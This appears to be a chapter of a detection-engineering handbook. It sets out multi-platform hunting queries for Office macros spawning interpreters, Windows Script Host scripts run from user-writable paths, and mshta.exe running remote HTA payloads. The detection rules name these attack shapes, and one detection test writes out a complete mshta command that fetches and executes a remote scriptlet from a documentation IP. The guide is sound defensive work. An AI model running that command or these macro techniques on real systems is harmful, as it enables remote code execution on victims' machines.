---
title: "Suspicious Scripting Hosts & Macro Execution"
part: 10
author: "author-agent"
reviewer: "technical-reviewer-agent"
status: "reviewed"
last_validated: "2026-09-16"
depends_on: []
---

# Part 10 — Suspicious Scripting Hosts & Macro Execution

## Why this part exists

**[CONCEPT]** Office applications, the Windows Script Host (`wscript.exe`/`cscript.exe`), and `mshta.exe` share one property an attacker values above almost any other: they are signed, ubiquitous, and already running on the exact host a phishing lure just landed on. A macro-enabled document or a `.hta`/`.vbs` attachment doesn't need to drop a new binary at all — it hands execution to an interpreter that was never going to trip a "new unsigned executable" heuristic, because it isn't new and it isn't unsigned. This part covers the moment that handoff happens: a document macro spawning a child process, a script host running a dropped or remote script, and `mshta.exe` executing an HTA payload.

This part starts after the document or script is already open and picks up at the execution handoff itself — how the file *got there* (the phishing attachment, the malicious URL) is DEH Part 17's territory, cited below rather than re-derived. It also stops short of two things this book covers elsewhere: what a macro's child process does once it has PowerShell logic to execute (this book's Part 8 owns encoded/obfuscated PowerShell invocation, download cradles, and AMSI-bypass shapes) and generic LOLBAS/GTFOBins binary abuse regardless of what spawned it (this book's Part 9). This part's own job is narrower and sits upstream of both: naming the office-app/WSH/HTA host as the parent or execution surface, not re-analyzing what a downstream interpreter does with the handoff.

## 1. Office macro execution chains

### QC-10-01 — Office application spawning a command or script interpreter as a direct child

| Field | Value |
|---|---|
| **Pattern ID** | `QC-10-01` |
| **MITRE** | T1204.002 (User Execution: Malicious File), T1059.005 (Command and Scripting Interpreter: Visual Basic) |
| **Behavior** | An Office application process (`WINWORD.EXE`, `EXCEL.EXE`, `POWERPNT.EXE`, `OUTLOOK.EXE`) launches a general-purpose interpreter or scripting host as a direct child process. |
| **DEH cross-ref** | DEH Part 11 §2 (process trees and lineage classification), §8 (worked case study: phishing document to ransomware precursor) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL (QRadar), YARA-L, Elastic KQL |

**[HUNTER]** Word, Excel, and PowerPoint have no legitimate reason to launch `cmd.exe`, `powershell.exe`, `wscript.exe`, or `mshta.exe` as a direct child in ordinary document use — this is the single highest-signal parent/child pairing in the phishing-to-execution chain, and it's cheap enough to hunt on an ad hoc basis without waiting for a standing rule to catch up on a newly reported macro family.

**[QUERY]** Sigma, against any backend populating a `process_creation` logsource with `Image`/`ParentImage`/`CommandLine`.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use

```yaml
title: Office application spawning a script or command interpreter
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\OUTLOOK.EXE'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Legitimate COM add-ins spawning a helper process — see [FALSE POSITIVE] below
level: high
```

Plausible expected result: a handful of matches a day in a mid-size fleet, clustered on hosts that just opened a document from an external sender, with `ParentImage` = `WINWORD.EXE` and `Image` = `powershell.exe` or `cmd.exe` the most common pairing. Interpretation: consistent with a macro handing off to an interpreter — treat as a strong starting point for triage, not confirmation of malicious intent on its own.

**[QUERY]** Sentinel/Defender KQL, against `DeviceProcessEvents`.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use

```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

Plausible expected result: rows keyed on `InitiatingProcessFileName` = `winword.exe`, `FileName` = `powershell.exe`, with `ProcessCommandLine` carrying an encoded or hidden-window flag. Interpretation: a well-instrumented fleet might settle to single-digit daily volume once known add-ins are excluded — this book has not validated a specific per-day count against production telemetry, so treat any baseline number as illustrative until you've measured your own.

**[QUERY]** Splunk SPL, against Sysmon Event ID 1 (Process Create) ingested under a Sysmon-aware sourcetype.

CONCEPTUAL SAMPLE — field names and thresholds illustrative; validate against your own schema and baseline before use

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  ParentImage IN ("*\\WINWORD.EXE","*\\EXCEL.EXE","*\\POWERPNT.EXE","*\\OUTLOOK.EXE")
  Image IN ("*\\cmd.exe","*\\powershell.exe","*\\wscript.exe","*\\cscript.exe","*\\mshta.exe")
| table _time, ComputerName, User, ParentImage, Image, CommandLine
```

Plausible expected result: one row per matching spawn event, `ParentImage` and `Image` populated as above, `CommandLine` often carrying a base64 blob or a `-w hidden` flag when the child is `powershell.exe`. Interpretation: same as the Sentinel read above — a starting point for triage, not a verdict.

**[QUERY]** QRadar AQL — this is AQL, not standard SQL, against a Sysmon-extended `events` view exposing custom properties for process name and parent process name.

CONCEPTUAL SAMPLE — custom property names illustrative; validate against your own DSM extension before use

```sql
SELECT starttime, sourceip, username, "Process Name", "Parent Process Name", "Command Line"
FROM events
WHERE "Parent Process Name" IN ('WINWORD.EXE','EXCEL.EXE','POWERPNT.EXE','OUTLOOK.EXE')
  AND "Process Name" IN ('cmd.exe','powershell.exe','wscript.exe','cscript.exe','mshta.exe')
LAST 24 HOURS
```

Plausible expected result: a small result set per day, `"Parent Process Name"` and `"Process Name"` populated only if the Sysmon DSM extension in use maps those custom properties — confirm the property names against your own extension before trusting an empty result as "clean." Interpretation: same read as above, gated on that property mapping actually existing.

**[QUERY]** YARA-L (Google SecOps), against a `PROCESS_LAUNCH` UDM event.

CONCEPTUAL SAMPLE — UDM field paths illustrative; validate against your own ingestion label's parser output before use

```yaral
rule qc_10_01_office_spawns_interpreter {
  meta:
    description = "Office application launches a command or script interpreter as a direct child"
    severity = "HIGH"

  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    $e.principal.process.file.full_path = /(?i)(WINWORD|EXCEL|POWERPNT|OUTLOOK)\.EXE$/
    $e.target.process.file.full_path = /(?i)(cmd|powershell|wscript|cscript|mshta)\.exe$/

  condition:
    $e
}
```

Plausible expected result: a match carries `principal.process.file.full_path` as the Office binary and `target.process.file.full_path` as the interpreter, assuming the ingestion label's parser populates both process roles for a launch event. Interpretation: same read as the other backends — treat a match as consistent with a macro handoff, not proof of one.

**[QUERY]** Elastic KQL — a single-event boolean match, the cheaper Elastic surface for this pattern's shape per DEH Appendix A5 §8's decision table.

CONCEPTUAL SAMPLE — ECS field names illustrative; validate against your own index mapping before use

```kql
process.parent.name : ("WINWORD.EXE" or "EXCEL.EXE" or "POWERPNT.EXE" or "OUTLOOK.EXE") and process.name : ("cmd.exe" or "powershell.exe" or "wscript.exe" or "cscript.exe" or "mshta.exe")
```

Plausible expected result: matching documents with `process.parent.name` an Office binary and `process.name` an interpreter, `process.command_line` carrying the actual invocation. Interpretation: same read as above.

**[FALSE POSITIVE]** Legitimate COM add-ins and Office integrations routinely spawn a child process from an Office parent with no attacker involved: Adobe's Acrobat PDFMaker add-in launching `Acrobat.exe`/`AcroCEF.exe` at PDF-export time, a Skype for Business or Teams click-to-call add-in launching a helper on a hyperlinked phone number, and Office's own Click-to-Run servicing launching `OfficeC2RClient.exe` during a background update. None of these match this pattern's child-process list directly, but a fleet-specific add-in that happens to shell out through `cmd.exe` for a legitimate reason will. Maintain an explicit allowlist of the known add-in child processes for your fleet rather than loosening the child-process list to work around one noisy add-in.

**[PIVOT]** Check the source document for a Mark-of-the-Web / `Zone.Identifier` alternate data stream indicating an internet-zone origin, and pull the delivery path per DEH Part 17's URL/attachment analysis if the file arrived by email. If the child interpreter itself then spawns a further process, follow the chain into this book's Part 8 (PowerShell-specific command-line analysis) or Part 9 (LOLBAS/GTFOBins) depending on what it is.

> **Detection Autopsy — "any child process of an Office app is malicious"**
>
> **The rule:** An earlier, broader version of this pattern fired on any child process at all spawned by `WINWORD.EXE`, `EXCEL.EXE`, or `POWERPNT.EXE`, with no restriction to interpreters.
>
> **Why it shipped:** It reads as the maximally conservative version of the signal — "Office apps shouldn't spawn anything" sounds safer than picking a specific list of interpreters to watch for.
>
> **How it failed:** A single mid-size fleet with Adobe's Office add-in installed produced dozens of `WINWORD.EXE`/`EXCEL.EXE` → `AcroCEF.exe` events per day, one for every PDF export a user ran — the rule generated more noise from a benign add-in than it ever generated true positives.
>
> **The fix:** Narrow the child-process list to general-purpose interpreters and script hosts specifically (the list in the query blocks above), and push add-in-specific noise to an explicit allowlist rather than a broad exclusion on "any child process."

### QC-10-02 — Macro-spawned child process reaching out to the network within seconds of launch

| Field | Value |
|---|---|
| **Pattern ID** | `QC-10-02` |
| **MITRE** | T1204.002 (User Execution: Malicious File), T1105 (Ingress Tool Transfer) |
| **Behavior** | A process spawned by an Office application makes an outbound network connection within a short window of its own creation — the download-cradle timing shape, distinct from the bare parent/child pairing in `QC-10-01`. |
| **DEH cross-ref** | DEH Part 9 §3.1/§3.2 (Sysmon Event ID 1/Event ID 3), DEH Part 11 §8 |
| **Languages covered** | KQL (Sentinel/Defender), SPL, AQL (QRadar), YARA-L, Elastic (EQL) — Sigma: `N/A`, see below |

**[HUNTER]** A macro that only spawns `powershell.exe` and stops is a dropper waiting to run; one whose child process reaches out to a remote host within the first couple of minutes is already fetching a second stage. The timing join between the spawn event and the first outbound connection is what separates this pattern from `QC-10-01` and is worth hunting even before a standing correlation rule exists for it, since the exact window that matters shifts with every campaign.

Sigma: `N/A` — structurally poor fit, not impossible. Expressing this two-stage timing join would require Sigma's correlation-rule extension's `temporal_ordered` type, which has narrow backend support; forcing it through that type here would misrepresent how portable the resulting rule actually is across the backends this book covers.

**[QUERY]** Sentinel/Defender KQL, joining `DeviceProcessEvents` to `DeviceNetworkEvents` on the child process's own process ID within a two-minute window.

CONCEPTUAL SAMPLE — join logic and window illustrative; validate the window against your own baseline before treating it as a cutoff

```kql
let Lookback = 1h;
DeviceProcessEvents
| where Timestamp > ago(Lookback)
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","powerpnt.exe")
| project SpawnTime = Timestamp, DeviceName, ChildProcessId = ProcessId, ChildImage = FileName, ChildCommandLine = ProcessCommandLine
| join kind=inner (
    DeviceNetworkEvents
    | where Timestamp > ago(Lookback)
    | project NetTime = Timestamp, DeviceName, InitiatingProcessId, RemoteUrl, RemoteIP
  ) on DeviceName, $left.ChildProcessId == $right.InitiatingProcessId
| where NetTime between (SpawnTime .. SpawnTime + 2m)
```

Plausible expected result: a handful of matches, `ChildImage` = `powershell.exe`, `RemoteUrl` or `RemoteIP` populated with a destination the host has no prior history contacting. Interpretation: consistent with a download-cradle handoff rather than a benign spawn-and-idle child.

**[QUERY]** Splunk SPL, using `transaction` to tie a Sysmon Event ID 1 spawn to a same-process Event ID 3 network connect via the shared `ProcessGuid`.

CONCEPTUAL SAMPLE — transaction grouping and maxspan illustrative

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
  (EventCode=1 ParentImage IN ("*\\WINWORD.EXE","*\\EXCEL.EXE","*\\POWERPNT.EXE"))
  OR EventCode=3
| transaction ProcessGuid maxspan=2m
| where mvcount(EventCode) > 1
| table _time, ComputerName, ParentImage, Image, DestinationIp, DestinationHostname
```

Plausible expected result: a transaction spanning both a matching Event ID 1 and a following Event ID 3 sharing `ProcessGuid`, `DestinationIp`/`DestinationHostname` populated. Interpretation: same read as the KQL version above.

**[QUERY]** QRadar AQL — this is AQL, not standard SQL. QRadar's Ariel query surface cannot express the timing join to network telemetry as one query; the block below is the investigative single-stage search that validates the base condition, per DEH Part 27 §2–3's own precedent for the multi-object model.

CONCEPTUAL SAMPLE — custom property names illustrative; the network-timing join itself requires a QRadar Custom Rule referencing a Reference Set, not shown here

```sql
SELECT starttime, sourceip, "Parent Process Name", "Process Name", "Command Line"
FROM events
WHERE "Parent Process Name" IN ('WINWORD.EXE','EXCEL.EXE','POWERPNT.EXE')
LAST 24 HOURS
```

Plausible expected result: candidate spawn events only — this query does not confirm the network-timing correlation itself. Interpretation: a hit here is a candidate for the standing multi-object rule, not a confirmed match of the full pattern.

**[QUERY]** YARA-L (Google SecOps), a multi-event rule joining a `PROCESS_LAUNCH` and a following `NETWORK_CONNECTION` on a shared process identity within a two-minute match window.

CONCEPTUAL SAMPLE — UDM field paths and window illustrative

```yaral
rule qc_10_02_macro_child_network_egress {
  meta:
    description = "Macro-spawned process makes an outbound connection shortly after launch"
    severity = "HIGH"

  events:
    $spawn.metadata.event_type = "PROCESS_LAUNCH"
    $spawn.principal.process.file.full_path = /(?i)(WINWORD|EXCEL|POWERPNT)\.EXE$/
    $spawn.target.process.pid = $pid

    $net.metadata.event_type = "NETWORK_CONNECTION"
    $net.principal.process.pid = $pid

  match:
    $pid over 2m

  condition:
    $spawn and $net
}
```

Plausible expected result: a matched window with both event variables populated for the same `$pid`, `$net.target.ip` or `$net.target.hostname` carrying the destination. Interpretation: same read as the KQL version.

**[QUERY]** Elastic EQL — an ordered, entity-joined sequence, the right Elastic surface for this pattern's shape per DEH Appendix A5 §8's decision table.

CONCEPTUAL SAMPLE — ECS field names and maxspan illustrative

```eql
sequence by process.entity_id with maxspan=2m
  [process where process.parent.name in ("WINWORD.EXE","EXCEL.EXE","POWERPNT.EXE")]
  [network where true]
```

Plausible expected result: a two-event sequence match, the `process` stage carrying the Office-app parent, the `network` stage sharing the same `process.entity_id` within the window. Interpretation: same read as the other backends.

**[FALSE POSITIVE]** Legitimate finance or reporting macros that spawn a helper process to pull data from an internal API or SharePoint endpoint within seconds of launch produce the identical timing shape — name the specific macro and destination and exclude by destination domain/IP rather than widening the timing window, which just gives a real attacker more room too.

**[PIVOT]** Check the destination domain or IP against first-seen/rare-destination logic (this book's Part 19, C2 & Beaconing Detection) and against DNS resolution history (Part 18) before escalating — a destination the fleet has contacted routinely for months is a different finding than one seen for the first time today.

> **Hunter's Note**
> Pick the join window from the actual cadence you observe, not from a round number. A two-minute window catches a cradle that fetches immediately; a macro that waits ten minutes before reaching out — deliberately, to dodge exactly this kind of timing hunt — needs a wider window or a separate rare-destination hunt (this book's Part 19) layered on top, not a bigger number bolted onto this same query.

## 2. Windows Script Host and HTA execution

### QC-10-03 — Windows Script Host executing from a user-writable or download-associated path

| Field | Value |
|---|---|
| **Pattern ID** | `QC-10-03` |
| **MITRE** | T1059.005 (Command and Scripting Interpreter: Visual Basic), T1059.007 (Command and Scripting Interpreter: JavaScript) |
| **Behavior** | `wscript.exe` or `cscript.exe` launches a script (`.vbs`/`.js`/`.jse`/`.wsf`) whose path sits under a Temp, Downloads, or other user-writable directory rather than a known application install path. |
| **DEH cross-ref** | DEH Part 11 §3.2 (Windows LOLBAS patterns), DEH Part 9 §3.1 |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL (QRadar), YARA-L, Elastic KQL |

**[HUNTER]** WSH is one of the oldest living-off-the-land execution surfaces on Windows and remains a common second stage after an HTA or macro drops a `.vbs`/`.js` file to disk — a hunter checking the script's own path, rather than waiting for a specific script's content to get flagged, catches the next campaign's dropped filename just as well as this one's.

**[QUERY]** Sigma, against a `process_creation` logsource.

CONCEPTUAL SAMPLE — path substrings illustrative; adapt to your own environment's user-writable path conventions

```yaml
title: WSH interpreter executing a script from a user-writable path
logsource:
  product: windows
  category: process_creation
detection:
  selection_host:
    Image|endswith:
      - '\wscript.exe'
      - '\cscript.exe'
  selection_path:
    CommandLine|contains:
      - '\AppData\Local\Temp\'
      - '\Downloads\'
      - '\Users\Public\'
  condition: selection_host and selection_path
falsepositives:
  - Software-deployment agents invoking a packaged .vbs from a cache directory — see [FALSE POSITIVE] below
level: medium
```

Plausible expected result: matches concentrated on hosts that recently opened an email attachment or browser download, `CommandLine` referencing a script filename with no obvious relation to any installed application. Interpretation: consistent with a dropped-script second stage; not on its own proof of malicious intent, since the same shape covers legitimate ad hoc scripting.

**[QUERY]** Sentinel/Defender KQL, against `DeviceProcessEvents`.

CONCEPTUAL SAMPLE — field names and path substrings illustrative

```kql
DeviceProcessEvents
| where FileName in~ ("wscript.exe","cscript.exe")
| where ProcessCommandLine has_any ("\\AppData\\Local\\Temp\\", "\\Downloads\\", "\\Users\\Public\\")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```

Plausible expected result: rows with `FileName` an interpreter, `ProcessCommandLine` referencing a script under one of the flagged paths, `InitiatingProcessFileName` often `explorer.exe` (a direct double-click) or a mail client. Interpretation: same read as the Sigma version.

**[QUERY]** Splunk SPL, against Sysmon Event ID 1.

CONCEPTUAL SAMPLE — field names and path substrings illustrative

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  Image IN ("*\\wscript.exe","*\\cscript.exe")
  CommandLine IN ("*\\AppData\\Local\\Temp\\*","*\\Downloads\\*","*\\Users\\Public\\*")
| table _time, ComputerName, User, Image, CommandLine, ParentImage
```

Plausible expected result: same shape as above, `ParentImage` frequently `explorer.exe` or `OUTLOOK.EXE`. Interpretation: same read as the Sigma version.

**[QUERY]** QRadar AQL — this is AQL, not standard SQL.

CONCEPTUAL SAMPLE — custom property names illustrative; validate against your own DSM extension before use

```sql
SELECT starttime, sourceip, username, "Process Name", "Command Line"
FROM events
WHERE "Process Name" IN ('wscript.exe','cscript.exe')
  AND ("Command Line" ILIKE '%\AppData\Local\Temp\%'
       OR "Command Line" ILIKE '%\Downloads\%'
       OR "Command Line" ILIKE '%\Users\Public\%')
LAST 24 HOURS
```

Plausible expected result: matching rows subject to the custom-property mapping actually existing on your Sysmon DSM extension. Interpretation: same read as above.

**[QUERY]** YARA-L (Google SecOps), against a `PROCESS_LAUNCH` UDM event.

CONCEPTUAL SAMPLE — UDM field paths illustrative

```yaral
rule qc_10_03_wsh_from_user_writable_path {
  meta:
    description = "WSH interpreter launched with a script path under a user-writable directory"
    severity = "MEDIUM"

  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    $e.target.process.file.full_path = /(?i)(wscript|cscript)\.exe$/
    $e.target.process.command_line = /(?i)(AppData\\Local\\Temp|Downloads|Users\\Public)/

  condition:
    $e
}
```

Plausible expected result: a match with `target.process.command_line` carrying the flagged path substring. Interpretation: same read as above.

**[QUERY]** Elastic KQL — single-event boolean match.

CONCEPTUAL SAMPLE — ECS field names and path substrings illustrative

```kql
process.name : ("wscript.exe" or "cscript.exe") and process.command_line : (*AppData\\Local\\Temp* or *Downloads* or *Users\\Public*)
```

Plausible expected result: matching documents with `process.name` an interpreter and `process.command_line` carrying the flagged path. Interpretation: same read as above.

**[FALSE POSITIVE]** Software-deployment tooling routinely runs a packaged `.vbs` via `wscript.exe` from a cache path that looks user-writable at a glance — SCCM's `ccmcache` directory is the concrete example, invoked by the deployment agent (`CcmExec.exe`) rather than by a user or a document. A path-substring rule with no parent-process check will flag every SCCM-deployed script alongside a real dropped payload. Exclude by `InitiatingProcessFileName`/`ParentImage` matching your known deployment agents rather than removing the cache path from the match list, which reopens the exact gap this pattern targets.

**[PIVOT]** Pull the actual script content (from disk if still present, or from an EDR's script-block/AMSI capture if the agent supports one for WSH) and check its parent process — a deployment agent parent clears most legitimate hits quickly, while `explorer.exe` or a mail client parent keeps this on the triage queue.

> **Blind Spot**
> This pattern depends on the script's own on-disk path looking suspicious. A script that stages itself under a legitimate-looking application directory, or one that WSH loads entirely from a command-line-embedded string with no `.vbs` file ever written to disk, produces no matching path substring at all and slips past every query above. Pair this pattern with content- or hash-based detection (this book's Part 22, Malware Indicators) rather than treating a clean path-based result as confirmation nothing ran.

### QC-10-04 — `mshta.exe` executing a remote or heavily-encoded HTA payload

| Field | Value |
|---|---|
| **Pattern ID** | `QC-10-04` |
| **MITRE** | T1218.005 (Mshta) |
| **Behavior** | `mshta.exe` launches with a command line referencing a remote `http(s)://` location, an inline `javascript:` URI, or a long encoded/obfuscated argument, rather than a local `.hta` file path. |
| **DEH cross-ref** | DEH Part 11 §3.2 (Windows LOLBAS patterns — `mshta.exe` row) |
| **Languages covered** | Sigma, KQL (Sentinel/Defender), SPL, AQL (QRadar), YARA-L, Elastic KQL |

**[HUNTER]** `mshta.exe` has almost no legitimate reason to fetch content from the network directly — most internal HTA use, where it still exists at all, points at a local or UNC file path — so a `mshta.exe` command line naming an `http(s)://` URL or an inline `javascript:` payload is close to a single-field indicator, and worth an ad hoc sweep any time a new phishing kit surfaces publicly rather than waiting on vendor signature coverage.

**[QUERY]** Sigma, against a `process_creation` logsource.

CONCEPTUAL SAMPLE — command-line substrings illustrative

```yaml
title: mshta.exe executing a remote or scripted HTA payload
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'javascript:'
  condition: selection
level: high
```

Plausible expected result: a small number of matches, `CommandLine` naming a remote URL or an inline `javascript:` blob rather than a local `.hta` path. Interpretation: consistent with a remote-HTA execution stage of a phishing kit.

**[QUERY]** Sentinel/Defender KQL, against `DeviceProcessEvents`.

CONCEPTUAL SAMPLE — command-line substrings illustrative

```kql
DeviceProcessEvents
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has_any ("http://","https://","javascript:")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```

Plausible expected result: rows with `ProcessCommandLine` naming a URL, `InitiatingProcessFileName` often a browser or mail client. Interpretation: same read as the Sigma version.

**[QUERY]** Splunk SPL, against Sysmon Event ID 1.

CONCEPTUAL SAMPLE — command-line substrings illustrative

```spl
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  Image="*\\mshta.exe"
  CommandLine IN ("*http://*","*https://*","*javascript:*")
| table _time, ComputerName, User, CommandLine, ParentImage
```

Plausible expected result: same shape as above. Interpretation: same read as above.

**[QUERY]** QRadar AQL — this is AQL, not standard SQL.

CONCEPTUAL SAMPLE — custom property names illustrative

```sql
SELECT starttime, sourceip, username, "Command Line"
FROM events
WHERE "Process Name" = 'mshta.exe'
  AND ("Command Line" ILIKE '%http://%' OR "Command Line" ILIKE '%https://%' OR "Command Line" ILIKE '%javascript:%')
LAST 24 HOURS
```

Plausible expected result: matching rows subject to the custom-property mapping existing on your Sysmon DSM extension. Interpretation: same read as above.

**[QUERY]** YARA-L (Google SecOps), against a `PROCESS_LAUNCH` UDM event.

CONCEPTUAL SAMPLE — UDM field paths illustrative

```yaral
rule qc_10_04_mshta_remote_hta {
  meta:
    description = "mshta.exe executing a remote or inline-scripted HTA payload"
    severity = "HIGH"

  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    $e.target.process.file.full_path = /(?i)mshta\.exe$/
    $e.target.process.command_line = /(?i)(https?:\/\/|javascript:)/

  condition:
    $e
}
```

Plausible expected result: a match with `target.process.command_line` naming the remote location or inline script. Interpretation: same read as above.

**[QUERY]** Elastic KQL — single-event boolean match.

CONCEPTUAL SAMPLE — ECS field names illustrative

```kql
process.name : "mshta.exe" and process.command_line : (*http\://* or *https\://* or *javascript\:*)
```

Plausible expected result: matching documents as above. Interpretation: same read as above.

**[FALSE POSITIVE]** A small number of organizations still run internal HTA-based kiosk or help-desk utilities that legitimately reference a local file share via `mshta.exe \\fileserver\share\tool.hta` — that path pattern doesn't match this pattern's `http(s)://`/`javascript:` filter directly, but a UNC-to-HTTP migration of the same internal tool would. Confirm any internal HTA tooling's exact invocation pattern and add it to an explicit allowlist before treating a UNC-path exclusion as sufficient.

**[PIVOT]** Resolve the destination domain/IP for first-seen and reputation signal (this book's Part 19), and check whether `mshta.exe` itself spawns a further child process — a common next hop into `powershell.exe` or `rundll32.exe` that hands off into this book's Part 8 or Part 9.

> **Detection Test**
> **Setup:** Domain-joined or standalone Windows test host, Sysmon installed with Event ID 1 enabled, no EDR agent active on the test host to avoid a confounding legitimate scan.
> **Action:** `mshta.exe javascript:a=GetObject("script:http://192.0.2.10/test.sct").Exec();close()` run from an interactive prompt on the test host (test infrastructure only — `192.0.2.10` is a TEST-NET-1 documentation address, not a live host).
> **Expected result:** One Sysmon Event ID 1 entry with `Image` ending `\mshta.exe` and `CommandLine` containing `javascript:` and the test URL, `ParentImage` matching the shell used to launch the test.

## 3. Macro execution below the process-tree line

### QC-10-05 — VBA macro execution with no child process, caught only by Office-specific telemetry

| Field | Value |
|---|---|
| **Pattern ID** | `QC-10-05` |
| **MITRE** | T1059.005 (Command and Scripting Interpreter: Visual Basic) |
| **Behavior** | A macro runs entirely inside the Office process itself — calling Win32 APIs directly via VBA rather than spawning a visible child process — and is observable, if at all, only through AMSI-for-Office or Attack Surface Reduction (ASR) audit telemetry, not through process-tree lineage. |
| **DEH cross-ref** | DEH Part 11 §7.1 (process injection: the broader surface behind one Sysmon event), DEH Part 28 §1.1 (missing-field caution for Windows-native UDM signals) |
| **Languages covered** | KQL (Sentinel/Defender), SPL — Sigma, AQL (QRadar), YARA-L, Elastic: `N/A`, see below |

**[HUNTER]** Every pattern earlier in this part depends on a macro spawning a visible child process. A macro author who instead calls Win32 APIs directly from VBA — allocating memory, writing shellcode, and executing it inside `WINWORD.EXE`'s own process space — produces none of that lineage, and this pattern exists to name that blind spot explicitly rather than let a hunter assume "no suspicious child process" means "no macro execution happened."

Sigma: `N/A` — missing schema field. No adopted Sigma `category` maps to Defender ASR audit-event telemetry across backends as of this writing; this is vendor-specific Defender taxonomy, not a portable event shape Sigma's generic logsource model covers.

**[QUERY]** Sentinel/Defender KQL, against `DeviceEvents` rows generated by the "Block Win32 API calls from Office macros" Attack Surface Reduction rule running in Audit or Block mode.

CONCEPTUAL SAMPLE — `ActionType` values illustrative; confirm the exact strings against your own tenant's Advanced Hunting schema before use

```kql
DeviceEvents
| where ActionType in ("AsrOfficeMacroWin32ApiCallsAudited", "AsrOfficeMacroWin32ApiCallsBlocked")
| project Timestamp, DeviceName, AccountName, ActionType, FolderPath, FileName, InitiatingProcessFileName
```

Plausible expected result: rows with `InitiatingProcessFileName` an Office binary and `ActionType` indicating the ASR rule fired, `FileName` naming the document that contained the macro. Interpretation: consistent with a macro calling a Win32 API this ASR rule watches for — a genuinely different confidence level than a confirmed shellcode execution, since the rule fires on the API call surface, not on a judgment about intent.

**[QUERY]** Splunk SPL, against the same `DeviceEvents`-shaped data ingested via the Microsoft 365 Defender Add-on for Splunk.

CONCEPTUAL SAMPLE — sourcetype and `ActionType` values illustrative; confirm against your own add-on's field mapping before use

```spl
index=m365_defender sourcetype="DeviceEvents"
  (ActionType="AsrOfficeMacroWin32ApiCallsAudited" OR ActionType="AsrOfficeMacroWin32ApiCallsBlocked")
| table _time, DeviceName, AccountName, ActionType, FileName, InitiatingProcessFileName
```

Plausible expected result: same shape as the KQL version, gated on the add-on's field mapping matching the query above. Interpretation: same read as above.

AQL: `N/A` — missing schema field. QRadar's default Ariel schema carries no property for Defender ASR audit events without a vendor-specific DSM/app extension this book cannot confirm is deployed.

YARA-L: `N/A` — missing schema field. UDM has no confirmed path distinguishing an ASR-audited macro API call from a generic alert event, the same caution DEH Part 28 §1.1 raises for other Windows-native signals.

Elastic: `N/A` — missing schema field. ECS has no native field set for this vendor-specific ASR audit taxonomy; representing it would require an unverified custom integration mapping, and forcing a translation without one would misrepresent telemetry this book cannot confirm exists on that backend.

**[FALSE POSITIVE]** Deploying this ASR rule in Audit mode fleet-wide routinely surfaces benign internal macros that call a flagged Win32 API for ordinary automation — an internal Excel reporting tool that shells out to open a companion PDF is a concrete, recurring example. A single hash or file that fires this consistently across many hosts with a known business purpose is a tuning candidate for an allowlist; a hit on a file hash with no prior history on that host is a different finding and should not be tuned away by the same allowlist logic.

**[PIVOT]** If a hit correlates with one of `QC-10-01` through `QC-10-04` on the same host in the surrounding minutes, treat it as one incident, not four separate findings — pull the full process tree for the host over that window before triaging any single pattern's hit in isolation.

> **Engineering Reality**
> This pattern only produces any telemetry at all if the "Block Win32 API calls from Office macros" ASR rule is deployed in at least Audit mode, and ASR rules require Microsoft Defender for Endpoint Plan 1 or 2 licensing, not the baseline Defender Antivirus that ships with every Windows install. A fleet without that licensing tier, or with the rule left at its unconfigured default, produces silent zero results from every query above — not an error, and not evidence the behavior didn't happen.

**[SOC MANAGEMENT]** With usable telemetry confirmed on only two of six backends, and gated behind a specific licensing tier and ASR configuration state, this pattern is a better fit for a monthly exploratory hunt than a standing, paged detection — track it at DEH Part 41's exploratory coverage tier until ASR audit telemetry is confirmed flowing in production, and revisit the coverage tier once it is (DEH Part 43 covers exactly this kind of staleness/coverage-debt tracking).

## Cross-references

DEH Part 9 §3.1/§3.2 (Sysmon Event ID 1/Event ID 3 telemetry mechanics) · DEH Part 11 §2–§3, §7.1, §8 (process-tree lineage, LOLBAS, process injection, worked phishing-to-ransomware case study) · DEH Part 17 (Email — the attachment/URL delivery vector this part starts after) · DEH Part 23 §6 and Appendix A5 §4/§8 (backend translation-loss framework and Elastic-surface decision table used throughout this part's `[QUERY]` blocks) · DEH Part 28 §1.1 (missing-schema-field caution for UDM) · DEH Parts 41–43 (Detection Coverage/Quality/Debt scoring, applied to this part's patterns in this book's Part 28) · this book's Part 8 (Suspicious PowerShell Execution) and Part 9 (LOLBins & Living-off-the-Land Execution) for the downstream interpreter logic once a pattern in this part hands off execution · this book's Part 19 (C2 & Beaconing Detection) and Part 18 (Suspicious DNS) for destination-reputation pivots named in `QC-10-02` and `QC-10-04`.
